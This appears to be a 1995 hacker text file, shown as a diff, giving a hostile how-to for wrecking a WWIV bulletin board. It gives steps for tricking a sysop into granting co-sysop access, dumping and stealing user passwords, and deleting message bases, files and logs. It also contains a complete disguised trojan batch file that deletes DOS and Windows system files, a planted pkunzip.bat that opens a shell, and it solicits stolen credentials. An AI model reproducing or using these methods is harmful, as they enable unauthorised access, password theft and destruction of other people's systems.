@@ -1,0 +1,241 @@
+                 ______________  
+                |  ___    ___  |                        
+                | |_  |  |  _| |  ______           ______          
+                |___| |  | |___| |_    _|        /        \
+                      |  |         |  |         |   /----\/
+                      |  |         |  |         |  | 
+                      |  |         |  |         |  |    ___                 
+                      |  |         |  |  __     |  |   <_  | Issue #:014      
+                     _|  |_       _|  |_|  |    |   \___/  | Date:09\17\95         
+                    |______|  () |_________| ()  \________/ ()               
+                     _ / /                            \ \ _                      
+                   / _ /     THE LONE GUNMEN Presents:  \ _ \                
+                  | |                                      | |              
+                  | |        How To KiLL a WWiV BoaRD      | |               
+                  | |          Written By: MoG             | |               
+                  | |                                      | |            
+                  | |                                      | |     
+                  |  \____________________________________/  |
+                   \________________________________________/
+                  
+
+
+
+********************************STOP******************************************
+*** In this day and age, anyone can get there hands on txt philez and that ***
+*** means that even the YuppIe kids, who don't follow directions, can (and ***
+*** will probly blow there faces,hands,fingers,noses,legs,nipples, and P-P ***
+*** blown off, so befor you continue read the File "DISCLAIM.ER!" that was ***
+*** included in the .ZIP file. it basicly says that you cant sew me if you ***
+*** get fucked. **************************************************************
+******************************************************************************
+      
+        
+        Well Hellow everyone. I was on a local board the other day, (PD that 
+is) and it was running the wowy-zowy-latest ver of WWiV! And wouldn't ya know,
+the sysop was an asshole.  And since i knew him from school, i wanted to see 
+how REALLY PISSED off i could make him. So i sat there and thought. and here's
+what my little 16-year old Psychotic Brain came up with:
+                 
+
+                            
+PART ONE:   HEA, i'll....if you give me sysop access!
+
+        Well We all know that You can always find a little punk-ass 12-year 
+old, or 15/16 running wwiv, and wanting all the little porno's he can get is
+vasoline covered hands on.  So you log on one day (As NEW) and use stuff that 
+semes real, like dont put PERCTOR, from 1313 Mochingbird Lane, East Jabib,NJ.
+Try looking in the phone book for a nice-guy type last name, and use a friend-
+ly handle like Rainbo or Chuck or Floppy Man.  Then be a typical user for a 
+week.  And just out of the blue say, "hea, i have a to of porno's that i got 
+the other day, and man they are hot! i'll givem to ya if you give me 255 
+access!"  Then after some negotiating, the rug-rat might do it, but they'll
+probly only give it to ya for a day or so. So after that, u/l a gif or 2, and 
+say you'll u/l more the next day. then call back at 3-4 in the mornig, or 
+any other time, but 3-4 EVERYONE is usualy asleep! 
+
+A---->Since you know have the co-sysop access, you can hit /? at the main 
+menu to see all the cool stuff you are able to do now, but my fav. is hitting 
+//UE and looking at all the users info, and PW's! copy the names,handles,
+last-4,and PW's to a file, u'l it to my board, and it wil all be put into my 
+LAMERZ of the month file but you have to tell me the name and number of the 
+bbs(or bbsS depending on if they work on other boards
+
+B---->Delete all the mesage bases, and file bases. Erase all users, and all 
+the on-line doorz. then type (from the main menu) //TE <ENTER> 95mmdd.log 
+(that is that day's log file.) then hang up. and call back. (i HOPE you didn't 
+erace you'r account too!) and from the main menu type //TE <ENTER> 95mmdd.log 
+(Yes the same as befor!) and if you look, it will have a log of you eraseing 
+all that nice stuff, so erase the evadence.  And when you get done with that 
+edit the file lastcall.log and erase that too. then from the main menu type 
+'/boot'.
+
+
+------------------------------------------------------------------------------
+PaRt 2 the trogen!  
+        
+        Call you'r special little person again, with another name.  And some
+how, find out some kinda util he needs. Whatever it is, tell him you have a 
+copy of it right here on flopy, but you have to do something now, and you can 
+u/l it later.  Then when you get home, make a file called install.bat. and in 
+this file you put:
+@ECHO OFF
+copy c:\dos\ansi.sys bbs.com
+copy bbs.com data\config.dat
+copy bbs.com data\users.lst
+copy bbs.com bbs.exe
+copy bbs.com c:\autoexec.bat
+del *.bat
+cd gfiles
+del *.ans
+del *.bbs
+del *.log                      NOTE: DON'T type anything like del *.* or
+cd ..                                format c:  cause that forces dos to 
+cd data                              come up with a (Y/N) prompt, and then 
+del *.dat                            mr dumy, wil get a little suspicious!
+cd\dos
+del *.exe
+del *.com
+del *.sys
+cd\windows
+del *.pif
+del *.com
+del *.exe
+copy *.* win.com
+----[STOP}----
+then use these 3 files i included with this zip.
+-1-> bat2exe instal.bat
+-1a->that converts the install.bat to install.exe, but if you type the exe 
+file you can see the chain of del's and copy's.
+-2-> epw install.exe  (USE WWIV for the password!)
+-2a->this encripts the file, and pw's it PW? no that'll give it away! just 
+     watch!
+-3-> bedit install.exe (i think that epw dosn't change it to a com. o can't 
+     remember right now)
+-3.1-> IN B-edit, hit tab to get to the ascii, and find the part about 
+      entering the PW, and change it to BBS type (4-charecter). and that'll
+      make the lamer think it is a cool util!
+NOW when mr. Stroke A. Lot runs it, it compleatly FUCKS his whole system!, 
+no meore dos, no more windows, no more HEAVILY NEEDED WWIV files!
+
+------------------------------------------------------------------------------
+PART 3 the archive nightmare!
+
+        Make a file called pkunzip.bat and in it there must be only one line. 
+'command' (NOT with the 2 ' tho!)
+and call out friendly neighborhood masterbator's board and u/l this file.
+THEN use the extract (e) and extract it. when his system wants to 'pkunzip' 
+it will look in the current dir FIRST, befor it serches the path, and then
+when it enters pkunzip it will execute the batch, running the command.com
+(if he's not runing os/2) and droping you right into dos!
+
+Part 3.1   the alt255!
+        While in dos, make a dirs called FUCK<alt255>YOU and ASS<alt255>HOLE
+        cause when he gose to erase the dirs by typing RD FUCK YOU, he cant
+        cause of our friendly little nul string, the 255. AND! you can also
+        make dirs like: (the _ represents a null charicter (alt255)
+        _         _._          _.__         _.___         FUCK_YOU.
+        __        __._         __.__        __.___        FUCK_YOU._
+        ___       ___._        ___.__       ___.___       FUCK_YOU.__
+        ____      ____._       ____.__      ____.___      FUCK_YOU.___
+        _____     _____._      _____.__     _____.___     FUCK_YOU.!
+        ______    ______._     ______.__    ______.___    FUCK_YOU.!_
+        _______   _______._    _______.__   _______.___   FUCK_YOU.!__
+        ________  ________._   ________.__  ________.___  FUCK_YOU._!_
+        I think you get the gist of things!
+
+Part 3.2   The DOS dir!
+        While in dos, visit dome directories, like dos, and windows.
+        try this:
+          in dos:                       in /windows
+        >cd\dos                     c:\?>cd\windows
+        >del *.com                  c:\windows>del win.com
+        >copy *.exe command.com     c:\windows\system>cd system
+        >copy *.* sys.com                             >copy *.* ..\win.com
+        >copy *.* more.com                            >del *.exe
+        >copy *.* help.com                            >del *.ini
+        >del c:\command.com                           >del *.386
+        >copy *.* ..\command.com                      >cd ..
+        >copy *.* a.TLG             c:\windows>copy *.* a.TLG
+        >copy *.* b.TLG                       >del *.exe
+                                              >del *.bmp
+                                              >del *.com
+                                              >del *.ini
+        NOTE!::NEVER type >del *.*, or format c:, cause it wants a (Y/N)check
+        and it will hang you out of the system.
+
+Part 3.3   The users.lst and config.dat
+        while in dos, copy the config.dat, and users.lst files to a 'free'
+        file dir that the little wanker has on his system. then use the pkzip
+        to add those 2 files to this one file.
+        After they have been added, type exit, to get back to the bbs, and d/l
+        the file you just put the users.lst and config.dat file to.
+        with thest 2 files you can get the system pw, and all the info about 
+        them.  And the easyist way to do this, is get a copy of WWIV from 
+        some board and install it, BUT don't run anything yet, after it 
+        makes the dirs and stuff go to the config.dat file that the bbs 
+        you just installed. and use list or something and view it. find where
+        it says SYSOP. sysop is the default sys PW. now you know where in the
+        file it is located.  copy the stolen config.dat and user.lst files 
+        over the new ones. use list again, and view it again.  now look where 
+        you saw SYSOP befor. what it now says is the system PW on that lamerz
+        board you were just on.  now run the init, and type in the system PW
+        you saw in the stolen config.dat.  to avoid all problems, go to the
+        modem settings, and set the com-port to 0.
+        Now get out of the INIT program, and type BBS, that loads the bbs.
+        it schould say a line or 2 about the guy who wrote this WWiV, then 
+        a blank WFC screen.  HiT 'U' for the user edit. now you schould see
+        all the users he had on his board (one per screen) and their PW's and 
+        stuff.  If You get a copy of the pw's and user names to me, i'll put 
+        them in my LAMERz' of the month file, and i'll note that they were all
+        gotten from you. (or not if you don't want me to.)
+
+Part 3.9  The PURE GENIOUS of it all!
+              ^^^^-^^^^^^^
+          While you are doing all this fun stuff in his (or her) system, the 
+          sysop's log will only put down that you archived a file. not that you 
+          put obcene mesages in as DiRs or that you know know all the users PW's!
+          and his. Nope, he just thinks that you extracted a file.
+
+ ------------------------------------------------------------------------------
+Well There ya go. all this fine stuff will work on un-regestered or un-modded
+ver. of WWIV up to V. 4.24 (the latest version out now) and it will still probly 
+work on medded boardz, pending that they didn't change the command names of
+//boot    //UE    //TE
+and if he/she/it/whatever did change them, the trogen, AND the pkunzip.bat
+things schould still work!
+-------------------------------------------------------------------------------
+                          mog's newz
+
+LAMERZ of THE MONTH!
+        LAMERZ OF THE MONT WILL BE A MONTHLY FILE (OR SET OF FILES) THAT 
+        CONTAINS USERS AND THIER PW'S LAST-4'S BOARDS IT WORKS ON, AND SO-ON
+        ALSO IT WILL HAVE PW'S FOR TELNET(IF YOU LITTLE SPANKERS CAN GET ME 
+        SOME!
+Board Status->
+        Well i was gonna change my board to oblivion/2 and still might. 
+        but renegade is working great for now. and if anyone can get on the 
+        ETERNiTY WHQ, (ETERNAL DIMENTIONS  I THINK) find out why the hell 
+        i can't connect.
+        And i an also happy to anounce it just bacame an official PcP DiSTRO
+        blablabla
+
+SaLuTaTioNz
+        Abigwar-GIVE ME 100 PENNiEZ OR i WiLL BLOW UP YOU'R HOUSE! (private joke)
+        Z      -Quite a smothie! Are ya ever gonna choze just one?
+        MuLDeR -Sk8r fags are cool!
+        Boo    -YOU ASS HOLE! I HATE YOU!
+        Falcon -I will make you, or maby just ask really nice!
+        Mr. Sandman- WHY DID YOU HAVE TO MOVE!!!!!! WHY WHY WHY!!!!
+        JJ     -Good luck playin' ball
+        MoG    -Hi there you hansome devil you!
+        Venom  -well little bro, maby one day....
+        everyone else: SAVE WATER! DRINK BEER!
+oh yea, Cott Lang: MAKE A BIGGER FILE_ID.DIZ LiMiT, and Everyone will love you!
+------------------------------------------------------------------------------
+copyright 1995 MoG
+copyright 1995 The Lone Gunmen
+copyright 1995 Psycho KiLLER Software
+
+------------------------------------------------------------------------------
+
